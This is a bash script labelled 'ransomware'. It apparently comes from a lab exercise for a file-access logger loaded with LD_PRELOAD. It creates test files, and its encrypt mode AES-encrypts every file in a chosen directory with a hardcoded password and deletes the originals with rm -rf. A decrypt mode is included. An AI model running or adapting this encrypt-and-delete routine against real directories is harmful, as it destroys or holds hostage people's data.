#!/usr/bin/bash

PASS="1234"
DIR=""
N=0

if [ "$EUID" -eq 0 ] 
then 
    echo "Do NOT run this as root!"
    exit
fi


function usage(){
    printf "Usage: \n"
    printf "./ransomware -n N -d DIR\n"
    printf "OR\n"
    printf "./ransomware -e DIR\n\n"
    printf "Options: \n"
    printf -- "-n,  --files     Create N files\n"
    printf -- "-d,  --dir       Place them in DIR\n"
    printf -- "-e,  --encrypt   Encrypt EVERYTHING under DIR\n"
    printf -- "-h,  --help      This help message\n\n"
    printf "Note: The given directory is CLEANED, be careful\n"
    printf "Note: Created files are then deleted\n"

    exit
}

function crypt(){
    for file in $DIR/*; do
        `LD_PRELOAD=./logger.so openssl enc -aes-256-cbc -in $file -pbkdf2 -out $file.encrypt -k $PASS`
        rm -rf $file
    done
    exit 0
}

function dcrypt(){
    for file in $DIR/*; do
        `LD_PRELOAD=./logger.so openssl enc -d -aes-256-cbc -in $file -pbkdf2 -out "${file/.encrypt/$OUT}" -k $PASS`
        rm -rf $file
    done
    exit 0
}

function create_files(){
    rm -rf $DIR && mkdir $DIR
    `LD_PRELOAD=./logger.so ./create_files -n "$N" -d "$DIR"`
    exit 0
}

if [[ $# -eq 0 ]];then
    usage
fi

while [[ ! -z "$1" ]]; do
    if [[ "$1" == "-h" ]] || [[ "$1" == "--help"  ]];then
        usage
    elif [[ "$1" == "-e" ]] || [[ "$1" == "--encrypt"  ]];then
        DIR="$2"
        crypt
    elif [[ "$1" == "-n" ]] || [[ "$1" == "--files"  ]];then
        N="$2"
        shift
    elif [[ "$1" == "-d" ]] || [[ "$1" == "--dir"  ]];then
        DIR="$2"
        shift
    elif [[ "$1" == "-u" ]] || [[ "$1" == "--decrypt"  ]];then
        DIR="$2"
        dcrypt
    else 
        usage
    fi
    shift
done

if [[ $N -lt 1 ]] || [[ "$DIR" == "" ]];then
    usage
fi

create_files


# # test the hashes
# for i in $(seq 1 $(($FILES+1)))
# do
#     # hash from log
#     LINE=$((i * 7))
#     LOG_HASH="$(echo $(sed "${LINE}q;d" $LOG 2>/dev/null) | rev | cut -d' ' -f 1 | rev)"
#     # echo $LOG_HASH
#     # hash from file
#     FILE_HASH="$(cat $DIR/FILE_$(($i-1)).encrypt | md5sum | sed 's/ -//g' | awk '{print toupper($0) }' )"

#     if [[ ${LOG_HASH} != ${FILE_HASH} ]];
#     then
#         printf "\nFILE_$(($i-1)).encrypt: \n"
#         printf "LOG_HASH: ${LOG_HASH}\n"
#         printf "CLC_HASH: ${FILE_HASH}\n"  
#     fi
# done
